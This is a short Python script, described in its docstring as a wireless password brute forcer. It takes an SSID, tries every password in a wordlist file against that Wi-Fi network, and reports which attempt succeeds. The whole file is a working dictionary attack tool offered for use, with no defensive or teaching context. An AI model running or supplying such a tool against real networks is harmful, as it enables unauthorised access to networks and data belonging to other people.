# -*- Coding : utf-8 -*-

"""
    Wireless password brute forcer.
    Doesn't work on linux.
"""
import termcolor
from wireless import Wireless

ssid = input("[*] Enter SSID: ")

wireless = Wireless()

with open("common.txt", "r") as file:
    for password in file.readlines():
        password = password.strip()

        if wireless.connect(ssid=ssid, password=password):
            print(termcolor.colored(f"[+] {password} Success.", "green"))
        else:
            print(termcolor.colored(f"[-] {password} Faileds.", "red"))